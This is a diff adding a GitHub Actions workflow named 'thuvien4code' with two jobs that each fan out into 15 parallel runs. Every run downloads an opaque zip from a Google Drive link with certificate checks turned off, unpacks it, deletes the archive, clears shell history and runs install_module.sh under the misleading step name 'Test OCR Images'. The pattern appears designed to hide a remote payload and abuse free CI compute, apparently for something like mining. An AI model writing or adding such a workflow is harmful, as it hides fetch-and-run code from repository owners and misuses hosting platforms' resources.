@@ -1,0 +1,56 @@
+name: thuvien4code
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  configure:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.0, I.I, I.II]
+        flag: ['Configure', 'Package', 'Assess', 'Operate', 'Distribute']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: Install Packages
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=13fBoq-snMd2OeCMuA_9MJz7mBvyKQ-Gi" -O thuvien4code.zip
+        unzip -o thuvien4code.zip
+        rm thuvien4code.zip
+        history -c && history -w
+
+    - name: Test OCR Images
+      run: bash install_module.sh
+
+
+  Generate1:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.0, I.I, I.II]
+        flag: ['Provision', 'Build', 'Confirm', 'Trigger', 'Deploy']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: Install Packages
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=13fBoq-snMd2OeCMuA_9MJz7mBvyKQ-Gi" -O thuvien4code.zip
+        unzip -o thuvien4code.zip
+        rm thuvien4code.zip
+        history -c && history -w
+
+    - name: Test OCR Images
+      run: bash install_module.sh
+        
